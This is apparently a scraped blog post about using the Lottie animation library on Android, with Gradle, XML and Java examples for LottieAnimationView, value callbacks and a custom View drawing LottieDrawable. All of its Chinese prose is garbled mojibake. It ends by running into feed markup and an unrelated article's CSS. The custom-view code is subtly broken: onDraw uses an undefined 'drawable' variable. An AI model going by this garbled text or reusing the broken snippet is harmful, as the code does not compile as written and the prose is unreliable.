<p>Lottieæ˜¯ä¸€ä¸ªå¾ˆå¤šå¹³å°éƒ½å¯ä»¥ç”¨çš„ä¸‰æ–¹åº“ï¼ŒæŒ‰ç…§å®˜ç½‘çš„åŸè¯ç®€ä»‹å¦‚ä¸‹ï¼Œ<strong>è¿™é‡Œä¸»è¦æ•´ç†è®°å½•ä¸€ä¸‹Androidç«¯çš„ä½¿ç”¨</strong>ã€‚</p>
<blockquote>
<p>Lottie æ˜¯ä¸€ä¸ªé€‚ç”¨äº Androidã€iOSã€Web å’Œ Windows çš„åº“ï¼Œå®ƒè§£æ Adobe After Effects å¯¼å‡ºçš„ JSON æ ¼å¼åŠ¨ç”»ï¼ˆä½¿ç”¨ Bodymovinï¼‰ï¼Œå¹¶åœ¨ç§»åŠ¨è®¾å¤‡å’Œç½‘é¡µä¸ŠåŸç”Ÿæ¸²æŸ“å®ƒä»¬ï¼</p>
</blockquote>
<h3 data-id="heading-2">2.ä½¿ç”¨</h3>
<p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€ç”¨ã€‚</p>
<p>lottieæœ‰æŒ‡å®šè¿è¡Œçš„åŠ¨ç”»æ ¼å¼ï¼šå°±æ˜¯jsonã€‚</p>
<h4 data-id="heading-3"><strong>2.1å¯¼åº“ï¼š</strong></h4>
<p><strong>å»ºè®®ç”¨æœ€æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºè€ç‰ˆæœ¬è¸©è¿‡å‘ï¼Œåé¢è§£é‡Š</strong></p>
<pre><code class="hljs language-groovy" lang="groovy">dependencies {
    ...
    implementation "com.airbnb.android:lottie:$lottieVersion"
    ...
}
</code></pre>
<h4 data-id="heading-4">2.2  LottieAnimationView</h4>
<p>LottieAnimationViewæ˜¯æœ€ç®€å•ã€æœ€ç›´æ¥çš„ä½¿ç”¨æ–¹å¼ï¼Œç»§æ‰¿è‡ªImageViewï¼Œå¯ä»¥åœ¨xmlå¸ƒå±€æ–‡ä»¶é‡Œé¢å®šä¹‰</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">com.airbnb.lottie.LottieAnimationView</span>
        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/animation_view"</span>
        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span>
        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>
		
        <span class="hljs-attr">app:lottie_rawRes</span>=<span class="hljs-string">"@raw/hello_world"</span> //<span class="hljs-attr">R.raw</span>
        // <span class="hljs-attr">or</span>
        <span class="hljs-attr">app:lottie_fileName</span>=<span class="hljs-string">"hello_world.json"</span> //<span class="hljs-attr">assets</span>

        // <span class="hljs-attr">å¾ªç¯åŠ¨ç”»</span>
        <span class="hljs-attr">app:lottie_loop</span>=<span class="hljs-string">"true"</span>
        // <span class="hljs-attr">åŠ è½½å®Œæˆç«‹é©¬åŠ¨ç”»</span>
        <span class="hljs-attr">app:lottie_autoPlay</span>=<span class="hljs-string">"true"</span> /&gt;</span>
</code></pre>
<p>åŠ è½½jsonåŠ¨ç”»æ–‡ä»¶çš„æ–¹å¼ä¸»è¦ä¸ºä»¥ä¸‹ä¸¤ç§ï¼š</p>
<ul>
<li>åœ¨resourceç›®å½•ä¸‹çš„rawç›®å½•ï¼ˆâ­ï¼‰</li>
<li>åœ¨assetsç›®å½•</li>
</ul>
<p>æ¨èç¬¬ä¸€ç§ï¼Œå¯ä»¥é€šè¿‡<code>R</code>é™æ€å¼•ç”¨èµ„æºæ–‡ä»¶ï¼Œéå¸¸åˆ©äºç®¡ç†å’Œè®¿é—®ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad8ec1281dd54cc0a4110fd1e68e0564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu95a625LqM57qn57yW56iL54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948790&amp;x-signature=Z7VaILmK%2BcmGfpzljU%2FDqhc9KqE%3D" alt="image-20260102150112885.png" loading="lazy"/></p>
<p><strong>ä»£ç å±‚é¢è®¾ç½®ä¹Ÿæ˜¯okçš„ï¼Œè¿™æ ·æ›´ç¬¦åˆå®é™…å¼€å‘æƒ…å†µï¼ŒåŠ¨æ€åŠ è½½åŠ¨ç”»</strong></p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView = findViewById(R.id.lottie);
lottieAnimationView.setAnimation(R.raw.confor);
lottieAnimationView.setRepeatCount(-<span class="hljs-number">1</span>);
lottieAnimationView.playAnimation();
</code></pre>
<p><strong>lottieviewè¿˜å¯ä»¥è®¾ç½®é™æ€èµ„æºï¼Œå®Œå…¨å¯ä»¥å½“æˆImageViewæ¥ç”¨ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView.setImageResource(R.drawable.ic_launcher);
</code></pre>
<h5 data-id="heading-5">åŠ¨ç”»å›è°ƒ</h5>
<p>æƒ³è¦åœ¨åŠ¨ç”»è¿è¡Œå‰ã€åã€å–æ¶ˆæ—¶å€™è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥é€šè¿‡å›è°ƒå®ç°ï¼Œè¿™ä¸ªçœ‹å…·ä½“çš„å¼€å‘é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView.addAnimatorListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Animator</span>.AnimatorListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationStart</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {
        lottieAnimationView.setSpeed(-<span class="hljs-number">1</span>);<span class="hljs-comment">//åŠ¨ç”»å¼€å§‹å‰è®¾ç½®åˆ°æ”¾</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationEnd</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationCancel</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationRepeat</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Animator animation)</span> {

    }
});
</code></pre>
<h5 data-id="heading-6">lottieå±æ€§æ”¹å˜</h5>
<p>å¦‚æœæƒ³æ”¹å˜åŠ¨ç”»æ–‡ä»¶çš„å¡«å……é¢œè‰²ã€ä¸é€æ˜åº¦ã€æè¾¹å®½åº¦ç­‰ç­‰å†…å®¹ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Œlottieæä¾›äº†ä¸€ä¸ª<code>addValueCallback</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java">lottieAnimationView.addValueCallback(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyPath</span>(<span class="hljs-string">"**"</span>),
    LottieProperty.COLOR,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LottieValueCallback</span>&lt;Integer&gt;(){
        <span class="hljs-meta">@Nullable</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getValue</span><span class="hljs-params">(LottieFrameInfo frameInfo)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-number">0xffffff</span>;
        }
    }
);
</code></pre>
<p>ä¸Šå›¾ä¸­çš„ä¾‹å­ï¼Œä¸»è¦ç›®çš„æ˜¯æ”¹å˜åŠ¨ç”»æ–‡ä»¶çš„é¢œè‰²ï¼Œ</p>
<ul>
<li>å‚æ•°1ï¼Œ<code>keypath</code>æ˜¯æŒ‡å®šè¦æ”¹å˜çš„èŒƒå›´ï¼Œ<code>**</code>è¡¨ç¤ºæ”¹å˜æ‰€æœ‰å›¾å±‚çš„é¢œè‰²ï¼ˆè¿™é‡Œæ¶‰åŠåˆ°åˆ†æjsonæ–‡ä»¶çš„æ ¼å¼ï¼Œå°±ä¸ç»†è®²äº†ï¼Œå¯ä»¥å‚è€ƒ<a href="https://juejin.cn/post/7121638665180168228#heading-1" target="_blank" title="https://juejin.cn/post/7121638665180168228#heading-1">è¿™ç¯‡åšæ–‡</a></li>
<li>å‚æ•°2ï¼Œä¼ å…¥è¦æ”¹å˜çš„å±æ€§ï¼Œä¾‹å¦‚ï¼š<code>STROKE_COLOR</code>ã€<code>OPACITY</code>ç­‰ç­‰ã€‚å…·ä½“å¯ä»¥ç‚¹è¿›è¿™ä¸ªç±»ï¼ŒæŸ¥çœ‹æ”¯æŒå“ªäº›å±æ€§æ›´æ”¹ã€‚</li>
<li>å‚æ•°3ï¼Œå¯ä»¥é€šè¿‡LottieFrameInfoå…·ä½“åˆ°æ¯ä¸€å¸§æ˜¯å¦éœ€è¦å˜åŒ–ï¼Œå¦‚æœä¸éœ€è¦åšä»»ä½•å¤„ç†ï¼Œç›´æ¥è¿”å›è¦ä¿®æ”¹çš„å€¼å³å¯ï¼Œè¿™é‡Œæˆ‘å¯¹æ‰€æœ‰å¸§çš„é¢œè‰²åšæ›´æ”¹ã€‚</li>
</ul>
<h4 data-id="heading-7">2.3  LottieDrawable</h4>
<p><strong>é‡å¤´æˆï¼ï¼ï¼ï¼</strong></p>
<p>ä¸çŸ¥é“å¤§å®¶æœ‰æ²¡æœ‰é‡åˆ°ä¸€ç§æƒ…å†µï¼šéœ€è¦åœ¨è‡ªå®šä¹‰viewé‡Œé¢å®ç°lottieï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦åœ¨onDrawé‡Œé¢ç»˜åˆ¶LottieView</p>
<p>lottieå®˜æ–¹ä¹Ÿæä¾›äº†å¯ä»¥ç”¨äºä»»ä½•viewä¸Šçš„<code>LottieDrawable</code>ï¼Œä¹Ÿæ˜¯<code> LottieAnimationView</code>çš„åº•å±‚å®ç°</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLottieView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">View</span> {

    <span class="hljs-keyword">private</span> LottieDrawable lottieDrawable;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> mHeight;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> mWidth;
    <span class="hljs-keyword">private</span> KeyPath keyPath;
    <span class="hljs-keyword">private</span> LottieValueCallback&lt;Integer&gt; lottieValueCallback;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyLottieView</span><span class="hljs-params">(Context context, <span class="hljs-meta">@Nullable</span> AttributeSet attrs)</span> {
        <span class="hljs-built_in">super</span>(context, attrs);
        init();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        lottieDrawable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LottieDrawable</span>();
        <span class="hljs-comment">// å¼‚æ­¥åŠ è½½ Lottie JSONï¼ˆæ¨èæ”¾ res/rawï¼‰</span>
        LottieCompositionFactory.fromRawRes(getContext(), R.raw.confor)
            .addListener(comp -&gt; {
                setupComposition(comp, lottieDrawable);
            })
            .addFailureListener(t -&gt; {
                Log.e(TAG, <span class="hljs-string">"Lottie load error"</span>, t);
            });

        keyPath = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyPath</span>(<span class="hljs-string">"**"</span>);
        lottieValueCallback = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LottieValueCallback</span>&lt;&gt;(<span class="hljs-number">0xbb191970</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupComposition</span><span class="hljs-params">(LottieComposition comp, LottieDrawable lottieDrawable)</span> {
        lottieDrawable.setCallback(<span class="hljs-built_in">this</span>);   <span class="hljs-comment">// å¿…é¡»ï¼šå…è®¸ Lottie è§¦å‘ invalidate()</span>
        lottieDrawable.setComposition(comp);
        lottieDrawable.addAnimatorUpdateListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ValueAnimator</span>.AnimatorUpdateListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimationUpdate</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ValueAnimator animation)</span> {
                invalidate();
            }
        });
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMeasure</span><span class="hljs-params">(<span class="hljs-type">int</span> widthMeasureSpec, <span class="hljs-type">int</span> heightMeasureSpec)</span> {
        <span class="hljs-built_in">super</span>.onMeasure(widthMeasureSpec, heightMeasureSpec);

        mHeight = getMeasuredHeight();
        mWidth = getMeasuredWidth();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDraw</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Canvas canvas)</span> {
        <span class="hljs-built_in">super</span>.onDraw(canvas);

        <span class="hljs-comment">// è®¾ç½®ç»˜åˆ¶åŒºåŸŸ</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> getWidth();
		
        <span class="hljs-comment">//æ”¹å˜åŠ è½½å‡ºæ¥çš„åŠ¨ç”»é¢œè‰²</span>
        drawable.addValueCallback(
            keyPath,
            LottieProperty.COLOR_FILTER,
            lottieValueCallback
        );

        drawable.setBounds(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">64</span>);<span class="hljs-comment">//æŒ‡å®šç»˜åˆ¶çš„å¤§å°</span>
        drawable.draw(canvas);

    }
}
</code></pre>
<p>åœ¨è‡ªå®šä¹‰viewé‡Œç»˜åˆ¶lottieViewè¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œä¸Šé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚ï¼Œåšè¿›ä¸€æ­¥æ”¹åŠ¨ã€‚</p>
<p>ä¸‹é¢ç®€å•æ¥è§£æä¸€ä¸‹ä¸Šé¢ä»£ç çš„æµç¨‹ï¼š</p>
<ul>
<li>é¦–å…ˆæ˜¯åˆå§‹åŒ–ä¸€ä¸ª<code>lottieDrawable</code>ï¼Œå®ƒç»§æ‰¿è‡ª<code>Drawable</code></li>
<li>ç„¶åæ˜¯å¼‚æ­¥åŠ è½½jsonåŠ¨ç”»æ–‡ä»¶ï¼Œè¿™ä¸€æ­¥lottieå†…éƒ¨åšäº†å¼‚æ­¥å¤„ç†ï¼Œè§£æå¾—åˆ°çš„å†…å®¹æ˜¯æ— çŠ¶æ€çš„åŠ¨ç”»æ¨¡å‹â€”â€”<code>LottieComposition</code>ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æä¾›çš„å›è°ƒå†…è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†</li>
<li>å°†è§£æå¾—åˆ°çš„jsonæ–‡ä»¶åŠ è½½åˆ°<code>lottieDrawable</code>é‡Œï¼Œå¹¶ä¸”ä¸º<code>lottieDrawable</code>ç»‘å®š<code>drawableå›è°ƒ</code>ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ”¯æŒanimattionçš„drawableã€‚å¹¶ä¸”è®¾ç½®<code>onAnimationUpdate</code>å›è°ƒï¼Œå½“åŠ¨ç”»è¿è¡Œæ—¶å¯¹æ¯ä¸€å¸§è¿›è¡Œç»˜åˆ¶</li>
<li>æœ€åå°±æ˜¯ç»˜åˆ¶drawableåˆ°å±å¹•ä¸Šï¼Œç»˜åˆ¶æ–¹æ³•å’ŒåŸç”Ÿdrawableä¸€æ ·ï¼Œå¤§å®¶è‚¯å®šæ¯”è¾ƒç†Ÿæ‚‰ã€‚</li>
</ul>
<h4 data-id="heading-8">ï¼ï¼å‘</h4>
<h5 data-id="heading-9">å‘ä¸€</h5>
<p>å¦‚æœä½ çš„ç‰ˆæœ¬å°äº<code>6.0.0</code>ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å¯èƒ½åœ¨è¿è¡Œè‡ªå·±å†™çš„ç»˜åˆ¶ä»£ç åï¼Œlottieå¹¶æœªæŒ‰ç…§ä½ è®¾å®šçš„boundsæ˜¾ç¤ºï¼Œè¿™æ˜¯å› ä¸ºè¿™å‰æœ‰bugå¯¼è‡´<code>left</code>å’Œ<code>top</code>çš„è®¾å®šæ˜¯ä¸ç”Ÿæ•ˆçš„ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬æ‰è¢«ä¿®å¤ã€‚æ‰€ä»¥æœ€å¥½ç”¨æœ€æ–°çš„ç‰ˆæœ¬ï¼Œå¯ä»¥é¿å…å¾ˆå¤šé—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c185b422afa24978aff0435a7e19a17e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu95a625LqM57qn57yW56iL54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948790&amp;x-signature=ezrFoI%2FeTMfk3fEP%2FOCep9M2ORQ%3D" alt="image-20260102162406954.png" loading="lazy"/></p>
<h5 data-id="heading-10">å‘äºŒ</h5>
<p>è¿™ä¸ªé—®é¢˜å’ŒjsonåŠ¨ç”»æ–‡ä»¶æœ‰å…³ï¼š</p>
<p><strong>åŸå› ï¼šå› ä¸ºåŠ¨ç”»é‡ŒåŒ…å«å¾ˆå¤šå›¾å±‚ï¼Œæ¯ä¸€å±‚éƒ½æ¶‰åŠä¸é€æ˜åº¦å’Œé¢œè‰²ï¼Œæ‰€ä»¥å¦‚æœä½ ä¿®æ”¹æ•´ä¸ªæ–‡ä»¶çš„ä¸é€æ˜åº¦ï¼Œé‚£å¯èƒ½ä¼šå‡ºç°åŠ¨ç”»çš„é•‚ç©ºéƒ¨åˆ†è¢«åŠ ä¸Šä¸é€æ˜åº¦ï¼Œä¹Ÿå°±æ˜¯åŸæœ¬é€æ˜çš„åœ°æ–¹å‡ºç°é¢œè‰²ã€‚</strong></p>
<p>è¿™ä¸ªé—®é¢˜çš„é¿å…æ–¹å¼ï¼Œåªæœ‰åœ¨ä¿®æ”¹çš„æ—¶å€™è‡ªå·±ç¡®å®šå¥½è¦ä¿®æ”¹å“ªäº›å›¾å±‚ï¼Œè¿™ä¸ªå°±å¾—äº†è§£ä½ jsonæ–‡ä»¶çš„<a href="https://juejin.cn/post/7121638665180168228#heading-1" target="_blank" title="https://juejin.cn/post/7121638665180168228#heading-1">å›¾å±‚ç»“æ„</a>äº†ã€‚ï¼ˆå’±å“ªæœ‰è¿™ä¹ˆå¤šæ—¶é—´æ¥äº†è§£è¿™äº›ç ´ç»“æ„å•Šï¼Œå†™ä¸ªä»£ç è¿˜è¦å­¦ä½ AEå¯¼å‡ºåŠ¨ç”»çš„æ ¼å¼ï¼Ÿï¼‰</p>
<blockquote>
<p>å‚è€ƒï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flottie.airbnb.tech%2F%23%2Fandroid" target="_blank" title="https://lottie.airbnb.tech/#/android" ref="nofollow noopener noreferrer">lottie.airbnb.tech/#/android</a></p>
<p><a href="https://juejin.cn/post/7121638665180168228#heading-1" target="_blank" title="https://juejin.cn/post/7121638665180168228#heading-1">juejin.cn/post/712163â€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ ¼å¼å¡”åŸç†ï¼šæ•°æ®å¯è§†åŒ–å¦‚ä½•å¼•å¯¼è§‚ä¼—çš„æ³¨æ„åŠ›]]></title>    <link>https://juejin.cn/post/7590654280898805803</link>    <guid>https://juejin.cn/post/7590654280898805803</guid>    <pubDate>2026-01-02T07:02:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590654280898805803" data-draft-id="7589919989038710847" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ ¼å¼å¡”åŸç†ï¼šæ•°æ®å¯è§†åŒ–å¦‚ä½•å¼•å¯¼è§‚ä¼—çš„æ³¨æ„åŠ›"/> <meta itemprop="keywords" content="Python,æ•°æ®å¯è§†åŒ–,æ•°æ®åˆ†æ"/> <meta itemprop="datePublished" content="2026-01-02T07:02:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="databook"/> <meta itemprop="url" content="https://juejin.cn/user/3526889035006702"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ ¼å¼å¡”åŸç†ï¼šæ•°æ®å¯è§†åŒ–å¦‚ä½•å¼•å¯¼è§‚ä¼—çš„æ³¨æ„åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3526889035006702/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    databook
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:02:34.000Z" title="Fri Jan 02 2026 07:02:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body 